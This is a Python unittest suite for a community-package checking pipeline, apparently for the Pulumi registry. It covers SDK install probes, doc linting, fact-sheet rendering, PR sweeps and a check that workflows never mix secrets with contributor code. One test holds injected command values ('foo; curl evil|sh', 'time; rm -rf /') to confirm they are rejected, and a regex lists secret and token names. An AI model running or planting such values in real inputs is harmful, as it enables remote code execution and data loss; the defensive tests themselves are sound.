from __future__ import annotations

import json
import os
import re
import sys
import tempfile
import unittest
from pathlib import Path
from typing import Any
from unittest.mock import patch

import yaml

sys.path.insert(0, str(Path(__file__).parent))
import cli  # noqa: E402
import comment_commands  # noqa: E402
import doc_lint  # noqa: E402
import fact_sheet  # noqa: E402
import github_api  # noqa: E402
import package_list  # noqa: E402
import sdk_install_probe  # noqa: E402
import verify_entry  # noqa: E402
from models import DocFile, DocFinding, Entry, InstallResult, Manifest, Version, provider_name  # noqa: E402

SCHEMA: dict[str, Any] = {
    "name": "time",
    "pluginDownloadURL": "https://get.example.com/time",
    "language": {
        "nodejs": {"packageName": "@pulumiverse/time"},
        "python": {"packageName": "pulumiverse_time"},
        "go": {"importBasePath": "github.com/pulumiverse/pulumi-time/sdk/go/time"},
    },
}


class InstallProbeTests(unittest.TestCase):
    def setUp(self) -> None:
        self.calls: list[list[str]] = []
        self._real_run = sdk_install_probe._run

        def fake(cmd: list[str], cwd: str | None = None, env: dict[str, str] | None = None) -> tuple[bool, str]:
            self.calls.append(cmd)
            return True, ""

        sdk_install_probe._run = fake

    def tearDown(self) -> None:
        sdk_install_probe._run = self._real_run

    def test_builds_safe_commands_from_schema(self) -> None:
        commands = {r.language: r.command for r in sdk_install_probe.probe_installs("time", "v0.1.1", SCHEMA)}
        self.assertEqual(commands["plugin"], "pulumi plugin install resource time v0.1.1")
        self.assertEqual(commands["nodejs"], "npm install @pulumiverse/time@0.1.1")
        self.assertEqual(commands["python"], "pip download pulumiverse_time==0.1.1")
        self.assertIn("go get github.com/pulumiverse/pulumi-time/sdk/go/time@v0.1.1", commands["go"])
        flat = [" ".join(c) for c in self.calls]
        self.assertTrue(any("-- @pulumiverse/time@0.1.1" in c for c in flat))  # passed as argv, never a shell
        self.assertTrue(any("--server https://get.example.com/time" in c for c in flat))

    def test_rejects_injected_identifiers_without_executing(self) -> None:
        evil = {**SCHEMA, "language": {**SCHEMA["language"], "nodejs": {"packageName": "foo; curl evil|sh"}}}
        results = {r.language: r.result for r in sdk_install_probe.probe_installs("time; rm -rf /", "v0.1.1", evil)}
        self.assertEqual(results["plugin"], "rejected")
        self.assertEqual(results["nodejs"], "rejected")
        self.assertFalse(any(c and c[0] in ("npm", "pulumi") for c in self.calls))

    def test_github_scheme_plugin_url_is_passed_as_server(self) -> None:
        schema = {**SCHEMA, "pluginDownloadURL": "github://api.github.com/o/r"}
        list(sdk_install_probe.probe_installs("time", "v0.1.1", schema))
        flat = [" ".join(c) for c in self.calls]
        self.assertTrue(any("--server github://api.github.com/o/r" in c for c in flat))

    def test_python_uses_pulumi_underscore_when_advertised_without_name(self) -> None:
        results = sdk_install_probe.probe_installs("thoth", "v1.0.0", {"name": "thoth", "language": {"python": {}}})
        self.assertEqual(next(r for r in results if r.language == "python").command, "pip download pulumi_thoth==1.0.0")

    def test_unadvertised_sdks_are_not_probed(self) -> None:
        results = sdk_install_probe.probe_installs("thoth", "v1.0.0", {"name": "thoth", "language": {}})
        self.assertEqual({r.language for r in results}, {"plugin"})


class PythonResolveTests(unittest.TestCase):
    def setUp(self) -> None:
        self._run, self._exists = sdk_install_probe._run, sdk_install_probe._pypi_version_exists

        def failing_run(cmd: list[str], cwd: str | None = None, env: dict[str, str] | None = None) -> tuple[bool, str]:
            return False, "ERROR: No matching distribution"

        sdk_install_probe._run = failing_run

    def tearDown(self) -> None:
        sdk_install_probe._run = self._run
        sdk_install_probe._pypi_version_exists = self._exists

    def test_sdist_only_resolves_via_metadata(self) -> None:
        def exists(package: str, version: str) -> bool:
            return True

        sdk_install_probe._pypi_version_exists = exists
        self.assertEqual(sdk_install_probe._python_resolves("pkg", "1.0.0"), (True, ""))

    def test_missing_package_still_fails(self) -> None:
        def missing(package: str, version: str) -> bool:
            return False

        sdk_install_probe._pypi_version_exists = missing
        ok, err = sdk_install_probe._python_resolves("pkg", "1.0.0")
        self.assertFalse(ok)
        self.assertIn("No matching distribution", err)


class CliNoticeTests(unittest.TestCase):
    def test_rejection_sheet_lists_offending_files(self) -> None:
        out = cli._rejection_sheet(["themes/x.md", "sdk/y.go"])
        self.assertIn("❌", out)
        self.assertIn("Not ready", out)
        self.assertIn("themes/x.md", out)

    def test_nothing_to_check_sheet(self) -> None:
        self.assertIn("Nothing to check", cli._nothing_to_check_sheet())

    def test_preview_reply_first_party_skips_build(self) -> None:
        _, comment, should_build = comment_commands._preview_reply(first_party=True)
        self.assertEqual(should_build, "false")
        self.assertIn("automatically", comment)

    def test_preview_reply_fork_builds(self) -> None:
        reaction, _, should_build = comment_commands._preview_reply(first_party=False)
        self.assertEqual(should_build, "true")
        self.assertEqual(reaction, "+1")

    def test_preview_failure_comment_links_the_run(self) -> None:
        posted: list[tuple[int, str]] = []
        real = github_api.post_comment

        def fake(pr: int, body: str) -> None:
            posted.append((pr, body))

        github_api.post_comment = fake
        os.environ.update(PR="11661", GITHUB_SERVER_URL="https://github.com",
                          GITHUB_REPOSITORY="pulumi/registry", GITHUB_RUN_ID="999")
        os.environ.pop("COMMENT_ID", None)
        try:
            comment_commands.preview_failed()
        finally:
            github_api.post_comment = real
        self.assertEqual(posted[0][0], 11661)
        self.assertIn("actions/runs/999", posted[0][1])
        self.assertIn("failed", posted[0][1])

    def test_package_list_and_publisher_allowlist_are_permitted(self) -> None:
        changed = ["community-packages/package-list.json",
                   "tools/resourcedocsgen/pkg/publishers/publisher-names.json"]
        self.assertEqual(cli._files_outside_allowlist(changed), [])

    def test_generated_files_are_offending(self) -> None:
        changed = ["community-packages/package-list.json",
                   "themes/default/content/registry/packages/thoth/_index.md",
                   "themes/default/data/registry/packages/thoth.yaml"]
        self.assertEqual(cli._files_outside_allowlist(changed),
                         ["themes/default/content/registry/packages/thoth/_index.md",
                          "themes/default/data/registry/packages/thoth.yaml"])


class DocLintTests(unittest.TestCase):
    def test_flags_broken_refs_and_ignores_absolute(self) -> None:
        issues = doc_lint.find_issues(
            "![logo](./logo.png)\n<a href=\"./page\">y</a>\nsee [config](./x.md)\n"
            "[ok](https://e.com)\n![ok](https://e.com/y.png)\n")
        self.assertEqual({i.line for i in issues}, {1, 2, 3})
        self.assertEqual({i.kind for i in issues}, {"relative-image", "raw-relative-link", "md-suffixed-link"})

    def test_clean_doc(self) -> None:
        self.assertEqual(doc_lint.find_issues("[x](https://y)\n![a](https://y/z.png)\n"), [])

    def test_uppercase_scheme_is_absolute(self) -> None:
        self.assertEqual(doc_lint.find_issues('<img src="HTTPS://e.com/a.png">\n'), [])


class PackageListTests(unittest.TestCase):
    def test_added_entries(self) -> None:
        base = '{"include":[{"repoSlug":"a/b","schemaFile":"s"}]}'
        grown = '{"include":[{"repoSlug":"a/b","schemaFile":"s"},{"repoSlug":"c/d","schemaFile":"t"}]}'
        self.assertEqual(package_list.added_entries(base, base), [])
        self.assertEqual([e.repoSlug for e in package_list.added_entries(base, grown)], ["c/d"])
        self.assertEqual([e.repoSlug for e in package_list.added_entries("[]", '[{"repoSlug":"c/d","schemaFile":"t"}]')],
                         ["c/d"])


class VerifyTests(unittest.TestCase):
    def test_provider_name_prefers_schema_then_repo_suffix(self) -> None:
        self.assertEqual(provider_name("x/pulumi-thoth", {"name": "thoth"}), "thoth")
        self.assertEqual(provider_name("x/pulumi-thoth", {}), "thoth")
        self.assertEqual(provider_name("x/pulumi-provider-dex", {}), "provider-dex")

    def test_unverifiable_entry_is_red_with_reason(self) -> None:
        manifest = verify_entry._unverifiable(Entry("x/pulumi-demo", "s.json"), "no release")
        self.assertFalse(manifest.green)
        self.assertEqual(manifest.error, "no release")
        self.assertEqual(manifest.providerName, "demo")

    def test_publisher_known_only_when_listed(self) -> None:
        names = {"Aten Security": "atensecurity", "aptible": "aptible"}
        self.assertTrue(verify_entry._publisher_known("Aten Security", names))
        self.assertFalse(verify_entry._publisher_known("Aten Security", {"aptible": "aptible"}))

    def test_absent_publisher_is_not_flagged(self) -> None:
        self.assertTrue(verify_entry._publisher_known("", {}))


class ReportTargetTests(unittest.TestCase):
    def test_prefers_recorded_pr_number(self) -> None:
        with tempfile.TemporaryDirectory() as scratch:
            cwd = os.getcwd()
            os.chdir(scratch)
            try:
                Path("pr-number.txt").write_text("42\n")
                self.assertEqual(comment_commands._target_pr(), 42)
            finally:
                os.chdir(cwd)

    def test_falls_back_to_owner_and_ref(self) -> None:
        pulls: list[dict[str, Any]] = [
            {"number": 1, "head": {"ref": "patch-1", "repo": {"owner": {"login": "alice"}}}},
            {"number": 2, "head": {"ref": "patch-1", "repo": {"owner": {"login": "bob"}}}}]
        real = github_api.open_pull_requests

        def fake() -> list[dict[str, Any]]:
            return pulls

        github_api.open_pull_requests = fake
        os.environ.update(PR_HEAD="patch-1", PR_HEAD_OWNER="bob")
        try:
            self.assertEqual(comment_commands._target_pr(), 2)
        finally:
            github_api.open_pull_requests = real
            del os.environ["PR_HEAD"], os.environ["PR_HEAD_OWNER"]


def _manifest(green: bool = True, warnings: bool = False, findings: list[DocFinding] | None = None,
              installs: list[InstallResult] | None = None, docs: list[DocFile] | None = None,
              publisher: str = "", publisherKnown: bool = True) -> Manifest:
    return Manifest("x/pulumi-demo", "s.json", "demo", Version("v1.0.0", "0" * 40), "x",
                    installs or [], findings or [], green=green, warnings=warnings, docs=docs or [],
                    publisher=publisher, publisherKnown=publisherKnown)


class FactSheetTests(unittest.TestCase):
    def test_green_render_with_docs_and_findings(self) -> None:
        out = fact_sheet.render(_manifest(
            findings=[DocFinding(12, "relative-image", "![a](./b.png)")],
            docs=[DocFile("docs/_index.md", 3, "# Title\n```go\nx\n```\n")]))
        self.assertIn("✅", out.splitlines()[0])
        self.assertIn("Doc-lint: 1 finding(s)", out)
        self.assertIn("docs/_index.md:12", out)
        self.assertIn("/blob/" + "0" * 40 + "/docs/_index.md", out)
        self.assertIn("# Title", out)

    def test_unknown_publisher_is_flagged_in_the_sheet(self) -> None:
        out = fact_sheet.render(_manifest(warnings=True, publisher="Aten Security", publisherKnown=False))
        self.assertIn("publisher listed", out)
        self.assertIn("⚠️", out)
        self.assertIn("not in `publisher-names.json`", out)

    def test_known_publisher_shows_row_without_warning_note(self) -> None:
        out = fact_sheet.render(_manifest(publisher="Aten Security", publisherKnown=True))
        self.assertIn("publisher listed", out)
        self.assertNotIn("not in `publisher-names.json`", out)

    def test_red_render_with_install_failure(self) -> None:
        out = fact_sheet.render(_manifest(
            green=False,
            installs=[InstallResult("python", "pip download x==1", "fail", error="No matching distribution")]))
        self.assertIn("❌", out.splitlines()[0])
        self.assertIn("Not ready", out)
        self.assertIn("/check", out)
        self.assertIn("pip download x==1", out)
        self.assertIn("No matching distribution", out)
        self.assertIn("<details>", out)

    def test_doc_fence_outgrows_backticks(self) -> None:
        self.assertEqual(fact_sheet._fence_longer_than_any_run_in("no ticks"), "```")
        self.assertEqual(fact_sheet._fence_longer_than_any_run_in("```go\nx\n```"), "````")

    def test_warning_render_is_yellow(self) -> None:
        out = fact_sheet.render(_manifest(
            green=True, warnings=True,
            installs=[InstallResult("nodejs", "npm install x@1", "fail", error="404")]))
        self.assertIn("🟡", out.splitlines()[0])
        self.assertIn("review the warnings", out.lower())
        self.assertNotIn("Ready for approval", out)

    def test_error_render_is_compact_and_red(self) -> None:
        manifest = _manifest(green=False)
        manifest.error = "No published GitHub release."
        out = fact_sheet.render(manifest)
        self.assertIn("❌", out.splitlines()[0])
        self.assertIn("Not ready", out)
        self.assertIn("No published GitHub release.", out)
        self.assertNotIn("docs generate", out)


class SweepTests(unittest.TestCase):
    def _sweep(self, status: str | None, files: list[str] | None = None,
               already: bool = False) -> list[tuple[str, dict[str, str]]]:
        dispatched: list[tuple[str, dict[str, str]]] = []
        with patch.object(github_api, "open_pull_requests",
                          lambda: [{"number": 7, "head": {"sha": "a" * 40}}]), \
             patch.object(github_api, "pull_request_files",
                          lambda pr: files if files is not None else [comment_commands.PACKAGE_LIST]), \
             patch.object(github_api, "pull_request_run_status", lambda w, s: status), \
             patch.object(github_api, "dispatch_exists", lambda w, label: already), \
             patch.object(github_api, "dispatch_workflow",
                          lambda w, inputs: dispatched.append((w, inputs))):
            comment_commands.sweep()
        return dispatched

    def test_dispatches_when_github_parked_the_run(self) -> None:
        self.assertEqual(self._sweep("action_required"),
                         [(comment_commands.CHECK_WORKFLOW, {"pr": "7", "head": "a" * 40})])

    def test_dispatches_when_no_run_exists(self) -> None:
        self.assertEqual(len(self._sweep(None)), 1)

    def test_skips_a_run_that_started_on_its_own(self) -> None:
        self.assertEqual(self._sweep("in_progress"), [])
        self.assertEqual(self._sweep("completed"), [])

    def test_skips_a_pr_that_does_not_touch_the_package_list(self) -> None:
        self.assertEqual(self._sweep("action_required", files=["README.md"]), [])

    def test_dispatches_each_head_once(self) -> None:
        self.assertEqual(self._sweep("action_required", already=True), [])

    def test_run_label_is_stable_per_head(self) -> None:
        self.assertEqual(github_api.dispatch_run_label(7, "a" * 40),
                         "Community package check · PR #7 · " + "a" * 12)


class CommandInvocationTests(unittest.TestCase):
    def test_a_bare_command_invokes(self) -> None:
        self.assertTrue(comment_commands._invokes("/check", "/check"))

    def test_a_command_on_its_own_line_invokes(self) -> None:
        self.assertTrue(comment_commands._invokes("- [x] SDKs published\n\n/check\n", "/check"))

    def test_arguments_after_the_command_invoke(self) -> None:
        self.assertTrue(comment_commands._invokes("/check please", "/check"))

    def test_the_fact_sheet_mentioning_the_command_does_not_invoke(self) -> None:
        self.assertFalse(comment_commands._invokes(
            "**Not ready.** Fix upstream, then comment `/check` to re-run.", "/check"))

    def test_a_fenced_command_does_not_invoke(self) -> None:
        self.assertFalse(comment_commands._invokes("Run this:\n```\n/check\n```\n", "/check"))

    def test_a_quoted_command_does_not_invoke(self) -> None:
        self.assertFalse(comment_commands._invokes("> /check\n\nI already tried that.", "/check"))


class CheckCommandTests(unittest.TestCase):
    def _run(self, minutes_check: int | None, minutes_dispatch: int | None) -> list[dict[str, str]]:
        dispatched: list[dict[str, str]] = []
        os.environ.update(PR="7", COMMENT_ID="1", COMMENTER="ren", ASSOC="NONE", COMMENT_BODY="/check")
        with patch.object(github_api, "pull_request_head", lambda pr: ("ren", "b" * 40)), \
             patch.object(github_api, "minutes_since_check_run", lambda s, n: minutes_check), \
             patch.object(github_api, "minutes_since_dispatch", lambda w, pr: minutes_dispatch), \
             patch.object(github_api, "add_reaction", lambda *a: None), \
             patch.object(github_api, "post_comment", lambda *a: None), \
             patch.object(github_api, "fact_sheet_comment", lambda pr: None), \
             patch.object(github_api, "dispatch_workflow",
                          lambda w, inputs: dispatched.append(inputs)):
            comment_commands.check_command()
        for name in ("PR", "COMMENT_ID", "COMMENTER", "ASSOC", "COMMENT_BODY"):
            del os.environ[name]
        return dispatched

    def test_author_dispatches_a_check(self) -> None:
        self.assertEqual(self._run(None, None), [{"pr": "7", "head": "b" * 40}])

    def test_a_recent_dispatch_rate_limits(self) -> None:
        self.assertEqual(self._run(None, 2), [])

    def test_a_recent_automatic_run_rate_limits(self) -> None:
        self.assertEqual(self._run(2, None), [])

    def test_an_old_check_does_not_rate_limit(self) -> None:
        self.assertEqual(len(self._run(60, 90)), 1)


class ChangedFilesTests(unittest.TestCase):
    def test_a_listing_replaces_the_git_diff(self) -> None:
        with tempfile.TemporaryDirectory() as scratch:
            listing = Path(scratch) / "changed.txt"
            listing.write_text("community-packages/package-list.json\nREADME.md\n")
            self.assertEqual(cli._changed_files("origin/master", str(listing)),
                             ["community-packages/package-list.json", "README.md"])


def _community_workflows() -> list[Path]:
    return sorted((Path(__file__).resolve().parents[3] / ".github/workflows").glob("community-package-*.yml"))


_SECRET = re.compile(r"secrets\.|ESC_ACTION|esc-action|ANTHROPIC_API_KEY|PULUMI_BOT_TOKEN|id-token: *write")
_RUNS_CODE = re.compile(
    r"cli\.py check(?![-\w])|npm (install|ci)|pip (install|download)|go get|go mod download|pulumi plugin install")


class SecretCodeSeparationTests(unittest.TestCase):
    """No community-package workflow may both hold a secret and run a contributor's code, or a
    malicious package could read the secret."""

    def test_no_step_holds_a_token_beside_contributor_code(self) -> None:
        for workflow in _community_workflows():
            for job in yaml.safe_load(workflow.read_text())["jobs"].values():
                for step in job.get("steps", []):
                    if "GITHUB_TOKEN" not in (step.get("env") or {}):
                        continue
                    self.assertNotRegex(step.get("run", ""), _RUNS_CODE,
                                        f"{workflow.name}: step '{step.get('name')}' holds a token and runs code")

    def test_no_workflow_mixes_secrets_with_contributor_code(self) -> None:
        workflows = _community_workflows()
        self.assertTrue(workflows, "no community-package workflows found")
        for workflow in workflows:
            text, name = workflow.read_text(), workflow.name
            holds_secret = bool(_SECRET.search(text))
            self.assertFalse(holds_secret and _RUNS_CODE.search(text), f"{name}: secret shares a job with code")
            self.assertNotIn("pull_request_target", text, name)
            if holds_secret:
                self.assertNotRegex(text, r"ref:.*\.head\.", f"{name}: secret job checks out the PR head")


class VerifyPackageYamlTests(unittest.TestCase):
    def _tree(self, root: Path, name: str, data: dict[str, Any], index: str | None = "# Stripe\n") -> Path:
        yaml_dir = root / "themes/default/data/registry/packages"
        yaml_dir.mkdir(parents=True, exist_ok=True)
        yaml_path = yaml_dir / f"{name}.yaml"
        yaml_path.write_text(json.dumps(data))
        if index is not None:
            index_dir = root / "themes/default/content/registry/packages" / name
            index_dir.mkdir(parents=True, exist_ok=True)
            (index_dir / "_index.md").write_text(index)
        return yaml_path

    def _verify(self, data: dict[str, Any], index: str | None = "# Stripe\n",
                publishers: dict[str, str] | None = None) -> Manifest:
        names = {"stripe": "stripe"} if publishers is None else publishers
        with tempfile.TemporaryDirectory() as scratch:
            root = Path(scratch)
            yaml_path = self._tree(root, "stripe", data, index)
            with patch.object(verify_entry, "_load_publisher_names", return_value=names):
                return verify_entry.verify_package_yaml(yaml_path, root)

    def test_registered_publisher_is_green(self) -> None:
        manifest = self._verify({"name": "stripe", "publisher": "stripe", "version": "0.4.0"})
        self.assertTrue(manifest.green)
        self.assertEqual(manifest.version.tag, "0.4.0")

    def test_a_prerelease_version_is_accepted(self) -> None:
        manifest = self._verify({"name": "stripe", "publisher": "stripe", "version": "0.3.0-beta.4"})
        self.assertTrue(manifest.green)

    def test_unregistered_publisher_blocks(self) -> None:
        manifest = self._verify({"name": "stripe", "publisher": "stripe", "version": "0.4.0"}, publishers={})
        self.assertFalse(manifest.green)
        self.assertFalse(manifest.publisherKnown)

    def test_missing_version_is_unverifiable(self) -> None:
        manifest = self._verify({"name": "stripe", "publisher": "stripe"})
        self.assertFalse(manifest.green)
        self.assertIn("no `version`", manifest.error)

    def test_missing_index_blocks_and_says_why(self) -> None:
        manifest = self._verify({"name": "stripe", "publisher": "stripe", "version": "0.4.0"}, index=None)
        self.assertFalse(manifest.green)
        self.assertIn("landing page", manifest.error)

    def test_doc_lint_findings_are_advisory(self) -> None:
        manifest = self._verify({"name": "stripe", "publisher": "stripe", "version": "0.4.0"},
                                index="# Stripe\n\n![diagram](./img/arch.png)\n")
        self.assertTrue(manifest.green)
        self.assertTrue(manifest.warnings)
        self.assertTrue(manifest.docLint)

    def test_delisted_package_is_skipped(self) -> None:
        manifest = self._verify({"name": "stripe", "publisher": "DEPRECATED", "version": "0.4.0"},
                                index=None, publishers={})
        self.assertTrue(manifest.delisted)
        self.assertTrue(manifest.green)

    def test_no_network_calls(self) -> None:
        import urllib.request
        with patch.object(urllib.request, "urlopen", side_effect=AssertionError("network call")):
            manifest = self._verify({"name": "stripe", "publisher": "stripe", "version": "0.4.0"})
        self.assertTrue(manifest.green)

    def test_sheet_renders_without_a_commit(self) -> None:
        manifest = self._verify({"name": "stripe", "publisher": "stripe", "version": "0.4.0"}, publishers={})
        sheet = fact_sheet.render(manifest)
        self.assertIn("not in `publisher-names.json`", sheet)
        self.assertNotIn("/commit/", sheet)


class ChangedPackageYamlTests(unittest.TestCase):
    def _changed(self, paths: list[str]) -> list[Path]:
        completed = type("R", (), {"stdout": "\n".join(paths)})()
        with patch("cli.subprocess.run", return_value=completed):
            return cli._changed_package_yamls("origin/master")

    def test_selects_only_package_yamls(self) -> None:
        changed = self._changed([
            "themes/default/data/registry/packages/stripe.yaml",
            "themes/default/content/registry/packages/stripe/_index.md",
            "themes/default/data/registry/package_versions/stripe.yaml",
            "community-packages/package-list.json",
        ])
        self.assertEqual(changed, [Path("themes/default/data/registry/packages/stripe.yaml")])

    def test_no_package_change_is_empty(self) -> None:
        self.assertEqual(self._changed(["README.md"]), [])


if __name__ == "__main__":
    unittest.main()
